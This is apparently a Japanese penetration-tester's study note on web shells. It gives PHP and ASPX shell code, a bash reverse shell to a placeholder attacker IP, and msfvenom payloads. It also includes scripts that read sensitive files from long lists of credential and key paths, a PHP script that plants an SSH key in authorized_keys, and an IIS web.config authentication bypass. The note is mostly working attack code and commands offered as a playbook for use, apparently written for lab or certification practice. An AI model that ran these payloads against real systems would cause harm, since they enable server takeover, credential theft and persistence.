- 関連ノート：
	- [What is the shell](What%20is%20the%20shell.md)

---

# WebShellの基本

## 概要・用途

 * Webサーバー上で任意のコードを実行するスクリプトの俗称
 * 初期侵入後の足場確保やネットワーク内での横展開が目的
 * ファイアウォール制限等によりBind / Reverse Shellが使えない場合の代替手段
> [!TIP]
> - WebShellを起点として、最終的にBind / Reverse Shellへ移行させるのが定石。
> - 初期侵入だけでなく、侵入後にhttpローカルサービスを利用することで横展開にも使える。

## 動作原理・実行権限

 * Webサーバープロセス（www-data等）の権限でコマンドが実行される
 * HTMLフォームやURL引数（クエリパラメータ）を介してコマンドを送信
 * ファイルの実行可否はサーバー設定（httpd.conf等）に依存しており、実行許可がない拡張子のファイルは、アクセスしても中身がテキスト表示されるのみ

> [!TIP] 設定上書きによる実行制限回避
> htaccessのAllowOverrideが有効な場合、サーバー設定の上書きが可能で、特定の拡張子（例：.hoge）をスクリプト（例：php）として実行させるなどの回避策がとれる

## WebShellの基本セットアップ

- ターゲットのテクノロジースタックに合わせて、ペイロードを変更する（WappalyzerやBurp Suiteのレスポンスキャプチャで判別可能）

以下、PHPを例に記載する。

1. phpのwebシェルスクリプトファイルを作成する
```php
<?php echo system($_GET["cmd"]); ?>
```

2. 作成したシェルスクリプトファイルを、Webアプリケーションにアップロード
	- アップロードの手段には、uploads機能（リモート）、もしくはファイル書き込み（ローカル）などがある

3. URLのcmd引数に任意のコマンドを入力する。
	- ※ 複数クエリの場合は、`&`も使う：`index.php?path=hoge.txt&cmd=whoami`

![](../../画像ファイル/Pasted%20image%2020230320131618.png)

$$WebShell実行例$$

---

# WebShellからReverse Shellへの展開

🐧Linux：WebShell上に以下のコマンドをエンコードて実行する
```zsh
<url>?cmd=bash -c 'bash -i >& /dev/tcp/<attacker_IP>/443 0>&1'
```
- エンコード方法はターゲット環境に応じて異なる
- 基本はBurp SuiteのHackVertorを使って、"url_encode_not_plus"する

🪟Windows：[What is the shell](What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)

トラブルシューティング: Reverse Shell を実行したのに接続が確立しない場合、FWなどにより遮断されていないか、問題の切り分けに使う
```zsh
# Attacker
sudo tcpdump -nni any host <attacker_IP> and port 4444
sudo nc -lvnp 4444

# Target WebShell
<url>?cmd=bash -c 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1'
```
- 何も表示されない場合は、コマンドが実行されていないか、FWで遮断
- SYNパケットのみ届く場合は、ポート番号が誤っている

> [!INFO]
> - Kali にはデフォルトで`/usr/share/WebShells`にプログラム言語ごとにさまざまなリバースシェルペイロードが用意されている。
> - [Reverse Shell Generator](https://www.revshells.com/)を使うと、環境に合わせたペイロードが生成できる。

---

# WebShell実行における注意とTips

## ⚠️注意点

- PentestMonkeyのペイロードのように、サイズが大きいものはうまくいかないときがある
	- →シンプルなWebShellを使用：`<?php echo system($_GET["cmd"]); ?>`

- PHPなどの言語固有のリバースシェルペイロードは、Unixベースのターゲット向けに書かれていることに注意
	-→ これらは、デフォルトでは<u>Windowsで動作しない</u>ため、[Reverse Shell Generator](https://www.revshells.com/)でシェルをcmdやpowershellでペイロードを生成する

- Webアプリケーションにペイロードをアップロードできても、phpでは、`shell_exec`の無効化などにより、`?cmd=id`などが実行できないことがある
	- →[WebShell](#トラブルシューティング)

## 💡Tip

- Linuxシステムにおけるファイルアップロード先として、初期侵入後は`/dev/shm`がベスト（webから読み込めるのであれば）
	- *PrivateTmp*の影響を受けないから
		- `/tmp`や`/var/tmp`は他のプロセスや同じApacheの別リクエストからもアクセスできないようにしているため、使えない
	- 通常書き込み可能だから
	- すべてのプロセスから同じパスでアクセス可能だから

---

# Webアプリのソースコードを取得する考え方と手法概要

- 関連ノート：
	- [Summary - Apex](../../Proving_Grounds_WriteUp/Summary%20-%20Apex.md)

## 目的

- Webアプリ（PHP / ASP / ASPX など）のサーバーサイドソースコードを入手し、ソース内に記載された以下の機密情報を取得すること
	- ハードコードされた認証情報
	- APIキー
	- 内部パス情報

## シチュエーション

- WebShellが実行できず、Information Disclosureにフォーカスするとき
- ==異なるアクセスチャネルを利用して情報を取得する==必要がある

## なぜHTTPからは取得できないのか

PHPやASPなどのサーバーサイド言語は、
HTTP経由でアクセスすると「実行結果のみ」が返却される

例：config.php
```php
<?php $password = "SuperSecret123"; ?>
<body>Hello!</body>
```
```sh
http://example/config.php
# Hello!
```

## ソースコードを取得できる条件

- HTTPとSMBで同じ物理ディレクトリを共有しているケースなどで有効

- 例えば、`/var/www/html/Documents`がHTTP と SMBの両方から参照可能な場合
	1. HTTPの*Path Traversal*の脆弱性を利用して`Documents`にPHPファイルを転送
	2. SMBでPHPファイルのソースコードを読み取る

---
---

# バックエンドテクノロジーごとの攻撃手法

## PHP

### 基本スクリプト

```php
<?php echo system($_GET["cmd"]); ?>
```

### ターゲット状態確認スクリプト

- cmd引数でコマンド実行できないとき、現在の状態確認
- phpinfoの内容、コマンド実行に必要なphp関数の有効有無
```php
<?php
	echo "<h3>phpinfo()</h3>";
	phpinfo();
	echo "<h3>disabled functions</h3>";
	echo nl2br(ini_get('disable_functions'))."<br>";
	echo "<h3>working dir & perms</h3>";
	echo "cwd: ".getcwd()."<br>";
	echo "uid: ".getmyuid()." gid: ".getmygid()."<br>";
	echo "<h3>can exec /proc?</h3>";
	echo "can proc_open? ".(function_exists('proc_open')? 'yes' : 'no')."<br>";
	echo "can shell_exec? ".(function_exists('shell_exec')? 'yes' : 'no')."<br>";
	echo "allow_url_fopen: ".ini_get('allow_url_fopen')."<br>";
?>
```
- WebShellができないなら、攻撃は==ファイル読み取り==に切り替える

| チェック項目                              | 確認内容                                     | 無効/制限されている場合                                                 | WebShellへの影響                                                      |
| ----------------------------------- | ---------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------------ |
| system() が使えない                      | `system()` が無効化                          | `system($_GET['cmd'])` が使えない                                 | 最もシンプルな WebShell が動かない。代替: `shell_exec()`, `exec()`, `passthru()` |
| shell_exec() が使えない                  | `shell_exec()` が無効化                      | `echo shell_exec($_GET['cmd'])` が使えない                        | 代替: `system()`, `exec()`, `passthru()`, backtick                   |
| exec() が使えない                        | `exec()` が無効化                            | `exec($_GET['cmd'], $out)` が使えない                             | 代替: `system()`, `shell_exec()`, `passthru()`                       |
| passthru() が使えない                    | `passthru()` が無効化                        | `passthru($_GET['cmd'])` が使えない                               | 代替: `system()`, `shell_exec()`, `exec()`                           |
| proc_open() が使えない                   | `proc_open()` が無効化                       | Pure PHP Reverse Shell (双方向通信型) が構築できない                      | 代替: bash利用の Reverse Shell (`bash -i >& /dev/tcp/IP/PORT`)          |
| disable_functions に全てのコマンド実行関数が含まれる | system, exec, shell_exec, passthru等が全て無効 | 全てのコマンド実行手法が使えない                                             | 致命的: WebShell もReverse Shell も構築不可                                |
| getcwd() が chroot jail 内            | ファイルシステムが制限された環境                         | jail 外のディレクトリにアクセス不可                                         | 探索・操作範囲が大幅に制限される                                                   |
| allow_url_fopen が Off               | リモートファイル読込が無効                            | `file_get_contents('http://<attacker_IP>/payload.txt')` が使えない | ペイロードのダウンロードができない。代替: curlコマンド、wgetコマンド                            |
| allow_url_include が Off             | リモートファイル実行が無効                            | `include($_GET['url'])` 型の攻撃が不可                              | LFI/RFI が制限される（ただし通常は Off が推奨）                                     |
| open_basedir が設定されている               | アクセス可能ディレクトリが制限                          | 設定されたパス外のファイルにアクセス不可                                         | `/var/www/html` 外を探索できない等の制限                                       |
| safe_mode が On                      | (PHP<5.4) 安全モードが有効                       | 多くの関数・コマンドが制限される                                             | 古い環境でのみ影響。代替手法を探す必要                                                |

### File読み取り

- WebShellが実行できないときに使用

基本
```php
<?php echo nl2br(file_get_contents('<filepath>')); ?>
```

再帰探索
```php
<?php
	$files = glob('<directory_path>/*');
	foreach ($files as $f) {
	    echo "===== $f =====\n";
	    echo nl2br(file_get_contents($f));
	}
?>
```

#### Unix/Linux + Apache環境

| カテゴリ                | ファイルパス                                        | 目的                 |
| ------------------- | --------------------------------------------- | ------------------ |
| システム情報              | `/etc/passwd`                                 | ユーザー一覧、ホームディレクトリ確認 |
|                     | `/etc/shadow`                                 | パスワードハッシュ（読めれば）    |
|                     | `/etc/group`                                  | グループ情報             |
|                     | `/etc/hosts`                                  | ホスト名マッピング          |
|                     | `/proc/self/environ`                          | 現プロセスの環境変数         |
|                     | `/proc/self/cmdline`                          | 起動コマンドライン          |
| Apache設定            | `/etc/apache2/apache2.conf`                   | メイン設定              |
|                     | `/etc/apache2/sites-enabled/000-default.conf` | バーチャルホスト設定         |
|                     | `/etc/apache2/sites-available/*.conf`         | 利用可能なサイト設定         |
|                     | `/etc/apache2/envvars`                        | Apache環境変数         |
|                     | `/etc/apache2/.htpasswd`                      | Basic認証情報          |
|                     | `/var/www/html/.htaccess`                     | ディレクトリ設定           |
| PHP設定               | `/etc/php/8.1/apache2/php.ini`                | PHP設定（バージョン要確認）    |
|                     | `/etc/php/*/apache2/conf.d/*.ini`             | 追加PHP設定            |
|                     | `/usr/local/lib/php.ini`                      | 代替PHPパス            |
| MySQL設定             | `/etc/mysql/my.cnf`                           | メイン設定              |
|                     | `/etc/mysql/mysql.conf.d/mysqld.cnf`          | サーバー設定             |
|                     | `/etc/mysql/debian.cnf`                       | Debian用認証情報        |
|                     | `/root/.my.cnf`                               | root用MySQL設定       |
|                     | `/home/*/.my.cnf`                             | ユーザー別MySQL設定       |
| アプリ設定               | `/var/www/html/config.php`                    | アプリ設定              |
|                     | `/var/www/html/database.php`                  | DB接続情報             |
|                     | `/var/www/html/db.php`                        | DB接続情報             |
|                     | `/var/www/html/settings.php`                  | 設定ファイル             |
|                     | `/var/www/html/.env`                          | 環境変数ファイル           |
|                     | `/var/www/html/config/database.php`           | DB設定（ディレクトリ分け）     |
|                     | `/var/www/html/includes/config.php`           | インクルード設定           |
|                     | `/var/www/html/app/config/*.php`              | アプリケーション設定         |
|                     | `/var/www/html/wp-config.php`                 | WordPress設定        |
| バックアップ              | `/var/www/html/*.bak`                         | バックアップファイル         |
|                     | `/var/www/html/*.old`                         | 旧ファイル              |
|                     | `/var/www/html/*.backup`                      | バックアップ             |
|                     | `/var/www/html/*~`                            | エディタバックアップ         |
|                     | `/var/www/html/*.swp`                         | Vim一時ファイル          |
| Git/Version Control | `/var/www/html/.git/config`                   | Git設定（認証情報）        |
|                     | `/var/www/html/.git/HEAD`                     | 現在のブランチ            |
|                     | `/var/www/html/.gitignore`                    | 除外ファイル一覧           |
| SSH                 | `/home/*/.ssh/id_rsa`                         | 秘密鍵                |
|                     | `/home/*/.ssh/id_rsa.pub`                     | 公開鍵                |
|                     | `/home/*/.ssh/authorized_keys`                | 許可された公開鍵           |
|                     | `/home/*/.ssh/known_hosts`                    | 既知ホスト              |
|                     | `/home/*/.ssh/config`                         | SSH設定              |
|                     | `/etc/ssh/sshd_config`                        | SSHサーバー設定          |
| 履歴ファイル              | `/home/*/.bash_history`                       | コマンド履歴             |
|                     | `/home/*/.mysql_history`                      | MySQLコマンド履歴        |
|                     | `/home/*/.php_history`                        | PHPコマンド履歴          |
|                     | `/root/.bash_history`                         | root履歴             |
| ログファイル              | `/var/log/apache2/access.log`                 | Apacheアクセスログ       |
|                     | `/var/log/apache2/error.log`                  | Apacheエラーログ        |
|                     | `/var/log/auth.log`                           | 認証ログ               |
|                     | `/var/log/mysql/error.log`                    | MySQLエラーログ         |
|                     | `/var/log/syslog`                             | システムログ             |
| Cron/スケジュール         | `/etc/crontab`                                | システムcron           |
|                     | `/var/spool/cron/crontabs/*`                  | ユーザーcron           |
|                     | `/etc/cron.d/*`                               | cron.d設定           |
| FTP設定               | `/etc/vsftpd.conf`                            | vsftpd設定           |
|                     | `/etc/vsftpd/user_list`                       | ユーザーリスト            |
|                     | `/etc/ftpusers`                               | FTP禁止ユーザー          |

#### Windows + IIS環境

| カテゴリ         | ファイルパス                                                                                       | 目的                 |
| ------------ | -------------------------------------------------------------------------------------------- | ------------------ |
| システム情報       | `C:\Windows\System32\drivers\etc\hosts`                                                      | ホスト名マッピング          |
|              | `C:\Windows\win.ini`                                                                         | Windows設定          |
|              | `C:\boot.ini`                                                                                | ブート設定              |
|              | `C:\Windows\System32\config\SOFTWARE`                                                        | レジストリハイブ（要権限）      |
| IIS設定        | `C:\Windows\System32\inetsrv\config\applicationHost.config`                                  | IISメイン設定           |
|              | `C:\inetpub\wwwroot\web.config`                                                              | サイト設定・ASP.NET設定    |
|              | `C:\Windows\System32\inetsrv\config\administration.config`                                   | 管理設定               |
| ASP.NET設定    | `C:\inetpub\wwwroot\web.config`                                                              | 接続文字列、アプリ設定        |
|              | `C:\inetpub\wwwroot\appsettings.json`                                                        | .NET Core設定        |
|              | `C:\inetpub\wwwroot\appsettings.Development.json`                                            | 開発環境設定（漏洩多い）       |
|              | `C:\inetpub\wwwroot\Global.asax`                                                             | アプリケーションイベント       |
|              | `C:\inetpub\wwwroot\App_Data\*.mdf`                                                          | ローカルDBファイル         |
| MSSQL設定      | `C:\Program Files\Microsoft SQL Server\MSSQL*.MSSQLSERVER\MSSQL\Binn\mssql.exe.config`       | SQL Server設定       |
|              | `C:\Program Files\Microsoft SQL Server\*\MSSQL\DATA\master.mdf`                              | マスターデータベース         |
|              | `C:\Program Files\Microsoft SQL Server\*\MSSQL\DATA\model.mdf`                               | モデルデータベース          |
| PostgreSQL設定 | `C:\Program Files\PostgreSQL\*\data\postgresql.conf`                                         | メイン設定              |
|              | `C:\Program Files\PostgreSQL\*\data\pg_hba.conf`                                             | 認証設定               |
| バックアップ       | `C:\inetpub\wwwroot\*.bak`                                                                   | バックアップファイル         |
|              | `C:\inetpub\wwwroot\*.old`                                                                   | 旧ファイル              |
|              | `C:\inetpub\wwwroot\bin\*.pdb`                                                               | デバッグシンボル（情報漏洩）     |
|              | `C:\Program Files\Microsoft SQL Server\MSSQL*.MSSQLSERVER\MSSQL\Backup\*.bak`                | データベースバックアップ       |
|              | `C:\*.bak`                                                                                   | 管理者による手動バックアップ     |
| ログファイル       | `C:\inetpub\logs\LogFiles\W3SVC1\*.log`                                                      | IISアクセスログ          |
|              | `C:\Windows\System32\LogFiles\HTTPERR\*.log`                                                 | HTTPエラーログ          |
|              | `C:\Program Files\Microsoft SQL Server\MSSQL*.MSSQLSERVER\MSSQL\Log\ERRORLOG`                | MSSQL現在のエラーログ      |
|              | `C:\Program Files\Microsoft SQL Server\MSSQL*.MSSQLSERVER\MSSQL\Log\ERRORLOG.*`              | MSSQL過去のエラーログ      |
|              | `C:\Program Files\Microsoft SQL Server\MSSQL*.MSSQLSERVER\MSSQL\Log\SQLAGENT.OUT`            | SQL Serverエージェントログ |
| 認証情報         | `C:\Users\*\.ssh\id_rsa`                                                                     | SSH秘密鍵             |
|              | `C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml`                                     | FileZilla接続履歴      |
|              | `C:\Users\*\AppData\Roaming\Microsoft\SQL Server Management Studio\*\SqlStudio.bin`          | SSMS設定（暗号化）        |
|              | `C:\Users\*\Documents\SQL Server Management Studio\*.sql`                                    | 保存されたSQLスクリプト      |
|              | `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | PowerShell履歴       |


#### phpinfo 着眼点

##### 致命的・高リスクな設定（RCE / RFI / LFI）

| 設定項目 (Directive)    | 注目すべき値          | ペンテスト観点でのリスク・攻撃手法           | 解説                                                                                                         |
| ------------------- | --------------- | --------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `allow_url_include` | On              | RFI (Remote File Inclusion) | ・【最重要】 外部サーバーの悪意あるPHPスクリプトを `include()` 可能<br>・RCE（遠隔コード実行）に直結する設定                                         |
| `allow_url_fopen`   | On              | RFI / SSRF / 外部ファイル読込       | ・PHPスクリプトから外部URLへのアクセスが可能<br>・`allow_url_include` と併用でRFIが成立<br>・Offでも `file_get_contents` 等でのSSRF踏み台リスクあり |
| `disable_functions` | 空欄 または 主要関数なし   | WebShellによるコマンド実行          | ・`system`, `exec`, `shell_exec`, `passthru` 等が制限されていない状態<br>・WebShell経由でのOSコマンド実行が容易                      |
| `open_basedir`      | no value (設定なし) | LFI (Local File Inclusion)  | ・ファイル操作のディレクトリ制限がない状態<br>・LFI脆弱性がある場合、`/etc/passwd` 等のシステムファイルへアクセス可能                                      |
| `file_uploads`      | On              | ファイルアップロード攻撃                | ・攻撃者がWebシェル等をアップロードできる前提条件<br>・`upload_max_filesize` と併せてサイズ制限も確認が必要                                       |
| `enable_dl`         | On              | 拡張モジュールのロード                 | ・実行時に動的にPHP拡張モジュールをロード可能<br>・悪意ある `.so` や `.dll` をロードさせ、システム制御を奪取可能                                        |

##### 情報漏洩・探索に役立つ設定

| 設定項目 (Directive)    | 注目すべき値    | ペンテスト観点でのリスク・攻撃手法              | 解説                                                                                           |
| ------------------- | --------- | ------------------------------ | -------------------------------------------------------------------------------------------- |
| `display_errors`    | On        | フルパス漏洩 / エラー情報                 | ・エラーメッセージがブラウザに出力される状態<br>・ディレクトリのフルパス（`/var/www/html/...`）特定が可能<br>・SQLi等のテスト時にDBエラー詳細を確認可能 |
| `session.save_path` | 書き込み可能なパス | Session Poisoning (LFI to RCE) | ・セッションファイルの保存先パス<br>・LFI脆弱性と組み合わせ、汚染されたセッションデータ（PHPコード含む）を読み込ませてRCEへ繋げる攻撃に利用                 |
| `document_root`     | (パス情報)    | Webルートの特定                      | ・Webサイトの物理パス（例：`/var/www/html`）を特定<br>・SQLiで `INTO OUTFILE` を使用する際の保存先パス特定に必須                |
| `extension_dir`     | (パス情報)    | LFIの探索                         | ・PHP拡張モジュールの格納ディレクトリ<br>・LFI攻撃時にこのディレクトリ内のファイルをターゲットにする場合あり                                  |
| `upload_tmp_dir`    | (パス情報)    | LFI via Upload                 | ・アップロードファイルの一時保存先<br>・空白の時は`/tmp`に保存されることが多い                                                 |

##### 環境情報・その他（Privilege Escalation / Architecture）

| 設定項目 (Directive)     | 注目すべき値             | ペンテスト観点でのリスク・攻撃手法         | 解説                                                                                                      |
| -------------------- | ------------------ | ------------------------- | ------------------------------------------------------------------------------------------------------- |
| `System`             | Kernel Ver / Arch  | Kernel Exploit / Payloads | ・OS種類、カーネルバージョン、アーキテクチャ（x86/x64）の確認<br>・権限昇格（PrivEsc）用のExploit選定に使用                                     |
| `PHP Version`        | 古いバージョン            | CVE (既知の脆弱性)              | ・PHP自体に既知の脆弱性（バッファオーバーフロー等）がないか確認                                                                       |
| `$_SERVER` / `$_ENV` | API Key / Password | 機密情報の漏洩                   | ・ページ下部の環境変数セクション（Environment / PHP Variables）<br>・`AWS_ACCESS_KEY` や `DB_PASSWORD` 等の機密情報が誤って露出していないか確認 |
| `imagick`            | インストール済み           | ImageTragick (RCE)        | ・ImageMagickのバージョン確認<br>・古い場合、画像処理の脆弱性（CVE-2016-3714等）を利用したRCEが可能                                       |

### SSH鍵書き込みによるエクスプロイト

- 関連ノート：[22 - SSH](../Ports%20-%20Service/22%20-%20SSH.md#公開鍵一覧の書き換え)
- ⚠️webサーバを動作させているユーザにはその権限があることは少ない

```php
<?php
// 公開鍵の内容（改行なしの1行）
$public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... kali@kali\n";

// .sshディレクトリを作成（存在しない場合）
@mkdir('/home/<username>/.ssh', 0700, true);

// authorized_keysに書き込み
file_put_contents('/home/<username>/.ssh/authorized_keys', $public_key);

// パーミッション設定
chmod('/home/<username>/.ssh', 0700);
chmod('/home/<username>/.ssh/authorized_keys', 0600);

echo "Public key added successfully!";
?>
```

---

## ASP / ASP.NET (IIS)

### 基礎知識

#### ASP と ASP.NET の違い

- Classic ASP
    - 古い技術で、拡張子は `.asp`
    - 方式: インタプリタ方式（1行ずつ実行するため低速）
    - 言語: VBScript, JScript（Windows Server 2000 / IIS 5.0 時代）

- ASP.NET
    - 現在の**主流**で、ASP.NET < 4.9 の拡張子は `.aspx`（新しいASP.NETには拡張子がない）
    - 方式: コンパイル方式
    - 言語: C#, VB.NET

#### ASP.NET の世代別比較表

「ASP.NET」という名前でも、中身は大きく3つの世代に分かれる

| 世代  | 名称                               | 特徴                           | 主な Web ルート            | 拡張子     |
| --- | -------------------------------- | ---------------------------- | --------------------- | ------- |
| 旧世代 | **ASP.NET Framework (~4.8)**     | レガシー。Windows専用。IISと密結合。      | `C:\inetpub\wwwroot`  | `.aspx` |
| 新世代 | ASP.NET Core (1.0~3.1)           | モダン。Linux等でも動作（クロスプラットフォーム）。 | `.../publish/wwwroot` | なし      |
| 最新  | .NET (5 / 6 / 7 / 8 / 9) (5+が総称) | Coreの名前が取れたが、中身はCoreの進化系。    | `.../publish/wwwroot` | なし      |

#### ディレクトリ構造と WebShell の設置場所

- ASP.NET Frameworkは、`.aspx`ファイルが動作するため、==WebShellのアップロード先として有効==

- ASP.NET Core以降は、通常は以下の階層に公開用ファイルが生成されるが、<u>aspxファイルは動作しないため無効</u>
	- たとえばアップロードした aspx ファイルにはアクセスできないが、.txtファイルなどのファイル形式ならアクセス可能という場合、ASP.NET Core以降と推定できる
```sh
# 具体例：/umbraco/bin/Debug/net6.0/publish
<プロジェクト名>/bin/[Debug | Release]/<.NETバージョン>/publish/
```
- publish フォルダ: 実際にWebサーバに公開すべきファイルがまとまっている場所

#### ターゲットのASPバージョン特定

`whatweb` などで詳細が分からない場合、以下の要素を組み合わせて判断する。

- HTTPレスポンスヘッダ:
    - `X-Powered-By: ASP.NET`：ASP.NET が動いている証拠
    - `X-AspNet-Version`: これがあれば旧世代（Framework）、なければ新世代（Core系）の可能性がある
- URLの拡張子:
    - `.aspx` あり：旧世代（Framework）
    - なし：新世代（Core以降）のルーティング機能
- ファイル構成:
    - `web.config` のみ：旧世代（framework）
    - `appsettings.json` や 大量の`*.dll` がある：新世代（Core系）

### 基本 ペイロード

#### WebShell 

- Payload：[cmdexec.aspx - GitHub](https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx)（`/use/share/webshells/aspx/cmd.aspx`）
- 実行例
```
http://target/shell.aspx
```

![](../../画像ファイル/Pasted%20image%2020260219000105.png)

- Auth Keyはスクリプトの中にある（通常woanware）

#### Reverse shell 

- 関連ノート：[☠️Msfvenom](../../Tools/☠️Msfvenom.md)

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<Port> -f aspx -o reverse.aspx
```

### Identify Target

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.IO" %>

User: <%= WindowsIdentity.GetCurrent().Name %><br>
Machine: <%= Environment.MachineName %><br>
OS: <%= Environment.OSVersion %><br>
64bit: <%= Environment.Is64BitOperatingSystem %><br>
AppPool Identity: <%= WindowsIdentity.GetCurrent().Name %><br>
Current Dir: <%= Directory.GetCurrentDirectory() %><br>
```

### ファイル読み取り

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%= File.ReadAllText(@"<file_path>") %>
```

#### 重要ファイル（Windows + IIS）

| パス                                                        | 内容            | ペンテスト的に嬉しいポイント                                                    |
| --------------------------------------------------------- | ------------- | ----------------------------------------------------------------- |
| C:\inetpub\wwwroot\web.config                             | サイト設定 / 接続文字列 | DB資格情報取得 → MSSQLログイン、machineKey取得 → ViewState改ざん・認証クッキー偽造、認証方式の把握 |
| C:\Windows\System32\inetsrv\config\applicationHost.config | IIS全体設定       | 仮想ディレクトリ・物理パス特定 → 隠しサイト発見・横展開、ハンドラ設定 → 実行可能拡張子把握、認証方式確認           |
| C:\inetpub\wwwroot\bin*.dll                               | .NETアセンブリ     | dnSpy / ILSpyで逆コンパイル → ハードコード資格情報・内部API・暗号鍵・ファイルパス取得              |
| C:\inetpub\wwwroot\App_Data*.mdf                          | ローカルDB        | オフライン解析 → ユーザー・ハッシュ取得 → クラック・資格情報再利用、アプリ構造把握                      |
| C:\inetpub\wwwroot\appsettings.json                       | .NET Core設定   | DB接続文字列・APIキー・JWTシークレット取得 → APIなりすまし・DB侵入                         |
| C:\inetpub\wwwroot\Global.asax                            | アプリケーションイベント  | 認証処理・ルーティング理解 → 認可バイパス・攻撃対象エンドポイント特定                              |
| C:\Program Files\Microsoft SQL Server                     | MSSQL本体       | DBファイル・設定取得 → サービスアカウント特定・権限昇格・バックアップから機密取得                       |
| C:\Users*\AppData\Roaming\FileZilla\recentservers.xml     | FTP接続履歴       | 平文FTP資格情報取得 → 別サーバ侵入・Webroot書き込み・横展開                              |

### ファイルアップロード

- 実行可能拡張子
	- aspx
	- ashx
	- asmx
- 拡張子は、[⚡️File upload vuln](../../../BSCP/Server-side/File%20upload%20vuln/⚡️File%20upload%20vuln.md#サーバ設定の上書きによるバイパス)で変更できる可能性がある

#### 認証バイパス

- IIS / ASP.NET の設定評価ルールとして、子ディレクトリの web.config は親の web.config を継承し、追加ルールとして評価される
- 子ディレクトリで親の web.config をclear（無効に）したうえで認証を不要とするweb.config を置けば、アクセスが可能になる
```xml
<?親?>
<authorization>
  <deny users="?" />
</authorization>
```

子ディレクトリに以下を置くと認証をバイパスできる
```xml
<?子?>
<authorization>
  <clear />
　<allow users="*" />
</authorization>
```

---
---

# トラブルシューティング

## リスナーで invalid shell / 接続が来ない場合の切り分け

### 想定される原因

- FW のルールで遮断されている
- ターゲット側のコマンド制約
	- 使用したツールがターゲット環境に存在しない
	- `nc` などのコマンドが通常版ではなく制限付き
- WebShell実行関数の制限（主に PHP）
	- `phpinfo()` の `disable_functions` により以下が無効化
	    - `exec`
	    - `system`
	    - `shell_exec`
	    - `passthru`  

### 原因ごとの対応

#### FW による遮断

- 何も起きないときはネットワーク到達性を疑う
- FW で完全に遮断されている場合は、そもそも `invalid shell` にすらならない  
- つまり`invalid shell` が出る＝通信は届いている

1. ICMP が通るか確認
```sh
# 攻撃者
sudo tcpdump -i tun0
# ターゲット
ping -c3 <attacker_ip> 
```
- tcpdump に ICMP が見えればpingは通る

2. HTTP 通信が可能か確認
```sh
# 攻撃者
echo test > test.txt
sudo python -m http.server 80

# ターゲット
wget <attacker_ip>/test.txt
```
- ファイル取得できるか
- 攻撃者側の python HTTP サーバログにGETリクエストが来るか

#### ターゲット側のコマンド制限

- 通常の `nc` が使えないケースがあるため`busybox`などとあわせて使う（そのほか、[revshell generator](https://www.revshells.com/)から別の手段を試す）

#### WebShell 実行関数の制限

- PHP の設定をまずは確認
```php
<?php phpinfo(); ?>
```
- `disable_functions`に以下があれば、WebShell はそもそも実行できない
	- `exec`
	- `system`
	- `shell_exec`
	- `passthru`
	- `popen`
	- `proc_open`

- 実行できないときは、攻撃ベクターを[WebShell](#File読み取り)に切り替える

